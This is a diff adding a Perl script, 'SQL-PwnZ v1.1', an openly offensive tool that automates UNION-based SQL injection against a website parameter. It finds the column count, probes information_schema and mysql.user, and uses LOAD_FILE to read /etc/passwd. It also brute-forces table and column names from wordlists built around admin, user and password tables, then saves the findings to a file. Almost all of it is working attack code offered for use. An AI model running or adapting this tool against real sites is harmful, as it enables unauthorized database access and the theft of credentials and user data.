@@ -1,0 +1,242 @@
+#!/usr/bin/perl
+
+###########################################################################################
+#                           -[+]- SQL-PwnZ v1.1 | By Login-Root -[+]-                   ###
+###########################################################################################
+
+###########################################################################################
+# [+] inf0:                                                                             ###
+###########################################################################################
+# It Searchs:                                                                           ###
+# ===========                                                                           ###
+#  - Nº of columns                                                                      ###        
+#  - Information_Schema && MySQL.User                                                   ###
+#  - LOAD_FILE                                                                          ###
+#  - Tables                                                                             ###                                                
+#  - Columns                                                                            ###
+#                                                                                       ###
+#  ...and save it on a nice text file.                                                  ###
+#                                                                                       ###
+###########################################################################################
+
+###########################################################################################
+# [+] Use:                                                                              ###
+###########################################################################################
+# perl sqlpwnz.pl [WEBSITE] [COLUMNS] [FILE] [COMMENT] [-T] [-C] [-NOCHECK]             ###
+#   [WEBSITE]: http://www.web.com/index.php?id=                                         ###
+#   [COLUMNS]: Limit of columns to check                                                ###
+#   [FILE]: File where save the results                                                 ###
+#   [COMMENT]: '/*' or '--' (Without '') (Optional)                                     ###
+#   [-T]: Try to brute force tables (Optional)                                          ###
+#   [-C]: Try to brute force columns (Optional)                                         ###
+#   [-NOCHECK]: Skip the initial check (Optional)                                       ###
+###########################################################################################
+
+###########################################################################################
+# [+] c0ntact:                                                                          ###
+###########################################################################################
+# MSN:    no.more@passport.com                                                          ###
+# Jabber: login-root@x23.eu                                                             ### 
+# E-Mail: login_root@yahoo.com.ar                                                       ###
+#                                                                                       ###
+###########################################################################################
+
+
+###########################################################################################
+# [+] sh0utz:                                                                           ###
+###########################################################################################
+# In memory of ka0x | Greetz: KSHA ; Psiconet ; Knet ; VenoM ; InyeXion                 ###
+# Many thanks to boER, who teach me a little of perl ;D                                 ###
+# VISIT: WWW.MITM.CL | WWW.REMOTEEXECUTION.ORG | WWW.DIOSDELARED.COM                    ###
+###########################################################################################
+
+###########################################################################################
+# ARGENTINA PRODUCT :)                                                                  ###
+###########################################################################################
+
+use LWP::Simple;
+
+if(!$ARGV[2])
+	{
+		 print "\n\n-[+]- SQL-PwnZ v1.1 | By Login-Root -[+]-\n=========================================";
+		 print "\n\nUse: perl $0 [WEBSITE] [COLUMNS] [FILE] [COMMENT] [-T] [-C] [-NOCHECK]\n";
+		 print "\n[WEBSITE]: http://www.web.com/index.php?id=\n[COLUMNS]: Limit of columns to check\n[FILE]: File where save the results\n[COMMENT]: '/*' o '--' (Without '') (Optional)\n[-T]: Try to brute force tables (Optional)\n[-C]: Try to brute force columns (Optional)\n[-NOCHECK]: Skip the initial check (Optional)\n\n";
+		 exit (0);
+	}
+	
+@nombretabla=('admin','tblUsers','tblAdmin','user','users','username','usernames','usuario',
+	  'name','names','nombre','nombres','usuarios','member','members','admin_table',
+	  'miembro','miembros','membername','admins','administrator',
+	  'administrators','passwd','password','passwords','pass','Pass',
+	  'tAdmin','tadmin','user_password','user_passwords','user_name','user_names',
+	  'member_password','mods','mod','moderators','moderator','user_email',
+	  'user_emails','user_mail','user_mails','mail','emails','email','address',
+	  'e-mail','emailaddress','correo','correos','phpbb_users','log','logins',
+	  'login','registers','register','usr','usrs','ps','pw','un','u_name','u_pass',
+	  'tpassword','tPassword','u_password','nick','nicks','manager','managers','administrador',
+	  'tUser','tUsers','administradores','clave','login_id','pwd','pas','sistema_id',
+	  'sistema_usuario','sistema_password','contrasena','auth','key','senha',
+	  'tb_admin','tb_administrator','tb_login','tb_logon','tb_members_tb_member',
+      'tb_users','tb_user','tb_sys','sys','fazerlogon','logon','fazer','authorization',
+      'membros','utilizadores','staff','nuke_authors','accounts','account','accnts',
+      'associated','accnt','customers','customer','membres','administrateur','utilisateur',
+      'tuser','tusers','utilisateurs','password','amministratore','god','God','authors',
+      'asociado','asociados','autores','membername','autor','autores','Users','Admin','Members',
+	  'Miembros','Usuario','Usuarios','ADMIN','USERS','USER','MEMBER','MEMBERS','USUARIO','USUARIOS','MIEMBROS','MIEMBRO');
+
+@nombrecolumna=('admin_name','cla_adm','usu_adm','fazer','logon','fazerlogon','authorization','membros','utilizadores','sysadmin','email',
+          'user_name','username','name','user','user_name','user_username','uname','user_uname','usern','user_usern','un','user_un','mail',
+          'usrnm','user_usrnm','usr','usernm','user_usernm','nm','user_nm','login','u_name','nombre','login_id','usr','sistema_id','author',
+          'sistema_usuario','auth','key','membername','nme','unme','psw','password','user_password','autores','pass_hash','hash','pass','correo',
+          'userpass','user_pass','upw','pword','user_pword','passwd','user_passwd','passw','user_passw','pwrd','user_pwrd','pwd','authors',
+          'user_pwd','u_pass','clave','usuario','contrasena','pas','sistema_password','autor','upassword','web_password','web_username');
+
+if ( $ARGV[0]   !~   /^http:/ ) 
+  {
+      $ARGV[0] = "http://" . $ARGV[0];
+  }
+
+if ($ARGV[3] =~ "--" || $ARGV[4] =~ "--" || $ARGV[5] =~ "--" || $ARGV[6] =~ "--")
+{
+	$cmn.= "+";
+	$cfin.="--";
+	print "\n[+] Comments to use: '--' & '+'";	
+}
+else
+{
+	$cmn.= "/**/";
+	$cfin.= "/*";
+	print "\n[+] Comments to use: '/*' & '/**/'";
+}
+
+open(WEB,">>".$ARGV[2]) || die "\n\n[-] Failed creating the file\n";
+if ($ARGV[3] =~ "-NOCHECK" || $ARGV[4] =~ "-NOCHECK" || $ARGV[5] =~ "-NOCHECK" || $ARGV[6] =~ "-NOCHECK")
+  {
+      print "\n[!] Skipping the initial check...\n";
+      print WEB "[WEBSITE]:\n\n$ARGV[0]\n";
+  }
+else
+  {
+      print "\n[!] Checking if the website is vulnerable...\n";
+      $sql=$ARGV[0]."-1".$cmn."union".$cmn."select".$cfin;
+      $response=get($sql)or die("[-] Wrong Website, check it\n");
+      if($response=~ /mysql_fetch_/ || $response=~ /You have an error in your SQL syntax/ || $response =~ /tem um erro de sintaxe no seu SQL/ ||         $response =~ /mysql_num_rows/ || $response =~ /Division by zero in/)
+        {
+            print "[+] Vulnerable website, script continues...\n";
+            print WEB "[WEBSITE]:\n\n$ARGV[0]\n";
+        }
+        else
+          {
+            print "[-] Website apparently not vulnerable to SQL Inyection, try another comment\n\n";
+            exit(1);
+          }
+  }
+print "\n[!] Looking up columns...\n";
+for ($column = 0 ; $column < $ARGV[1] ; $column ++)
+{
+	$union.=','.$column;
+	$inyection.=','."0x6c6f67696e70776e7a";
+    if ($column == 0)
+      {
+          print WEB "\n[COLUMNS]:\n\n";
+          $inyection = '';
+          $union = '';
+      }
+    $sql=$ARGV[0]."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cfin;
+    $response=get($sql)or die("[-] Failed to try to find the number of columns, check website\n");
+    if($response =~ /loginpwnz/)
+      {
+         $column ++;
+         print "[+] The site has $column columns\n\n";
+         $sql=$ARGV[0]."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cfin;
+         print "$sql\n";
+         print WEB "$sql\n";
+         print "\n[!] Checking if Information_Schema exists...";
+         $sql=$ARGV[0]."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."information_schema.tables".$cfin;
+         $response=get($sql)or die("[-] Impossible to get Information_Schema\n");
+         if($response =~ /loginpwnz/)
+         	{
+         		print "\n[+] Information_Schema available...saving in $ARGV[2]";
+            $sql=$ARGV[0]."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."information_schema.tables".$cfin;
+            print WEB "\n\n[INFORMATION_SCHEMA]:\n\n$sql\n";
+            	
+         	}
+         else
+         	{
+            	print "\n[-] Information_Schema unavailable";
+         	}
+         print "\n[!] Checking if MySQL.User exists...";
+         $sql=$ARGV[0]."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."mysql.user".$cfin;
+         $response=get($sql)or die("[-] Impossible to get MySQL.User\n");
+         if($response =~ /loginpwnz/)
+         	{
+         		print "\n[+] MySQL.User available...saving in $ARGV[2]";
+         		$sql=$ARGV[0]."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."mysql.user".$cfin;
+            	print WEB "\n\n[MYSQL.USER]:\n\n$sql\n";
+            	
+         	}
+         else
+         	{
+            	print "\n[-] MySQL.User unavailable";
+         	}
+	while ($loadcont < $column-1)
+	   {
+		$loadfile.=','.'load_file(0x2f6574632f706173737764)';
+		$loadcont++;
+	   }
+	print "\n[!] Checking if it is possible to inject LOAD_FILE...";
+        $sql=$ARGV[0]."-1".$cmn."union".$cmn."select".$cmn."load_file(0x2f6574632f706173737764)".$loadfile.$cfin;
+	$response=get($sql)or die("[-] Impossible to inject LOAD_FILE\n");
+         if($response =~ /root:x:/)
+         	{
+         		print "\n[+] LOAD_FILE available...saving in $ARGV[2]";
+         		print WEB "\n\n[LOAD_FILE]:\n\nload_file(0x2f6574632f706173737764) => OK! (0x2f6574632f706173737764 => /etc/passwd)\n";
+          }
+         else
+         	{
+            	print "\n[-] LOAD_FILE unavailable";
+         	}
+	if ($ARGV[3] =~ "-T" || $ARGV[4] =~ "-T" || $ARGV[5] =~ "-T" || $ARGV[6] =~ "-T")
+         	{
+              print "\n\n[!] Brute forcing tables...";
+              print WEB "\n\n[TABLES]:\n\n";
+              foreach $tabla(@nombretabla)
+                {
+                  chomp($tabla);
+                  $sql=$ARGV[0]."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn.$tabla.$cfin;
+                  $response=get($sql)or die("[-] Impossible to get tables\n");
+                  if($response =~ /loginpwnz/)
+                    {
+                        print "\n[+] Table $tabla exists...saving in $ARGV[2]";
+                        $sql=$ARGV[0]."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn.$tabla.$cfin;
+                        print WEB "$sql\n";
+                    }
+                }
+           	}
+        if ($ARGV[3] =~ "-C" || $ARGV[4] =~ "-C" || $ARGV[5] =~ "-C" || $ARGV[6] =~ "-C")
+          {
+          	print "\n\n[!] Table to brute force columns: ";
+            $tabla.=<STDIN>;
+            chomp($tabla);
+            print WEB "\n\n[COLUMNS IN TABLE $tabla]:\n\n";
+            foreach $columna(@nombrecolumna)
+            {
+             chomp($columna);
+             $sql=$ARGV[0]."-1".$cmn."union".$cmn."select".$cmn."concat(0x6c6f67696e70776e7a,0x3a,$columna)".$inyection.$cmn."from".$cmn.$tabla.$cfin;
+             $response=get($sql)or die("[-] Impossible to get columns\n");
+             if ($response =~ /loginpwnz/)
+                  {
+                      print "\n[+] Column $columna available...saving in $ARGV[2]";
+                      print WEB "$columna\n";
+                  }
+            }
+        }
+        print WEB "\n\n\n[*EOF*]";
+        print "\n\n[+] Everything saved correctly in $ARGV[2]\n\n";
+        print "## c0ded by Login-Root | 2008 ##\n\n";
+        exit (0);
+      }
+}
+print "[-] Impossible to find number of columns, try more columns\n\n";
+print "## c0ded by Login-Root | 2008 ##\n\n";
+exit (0);
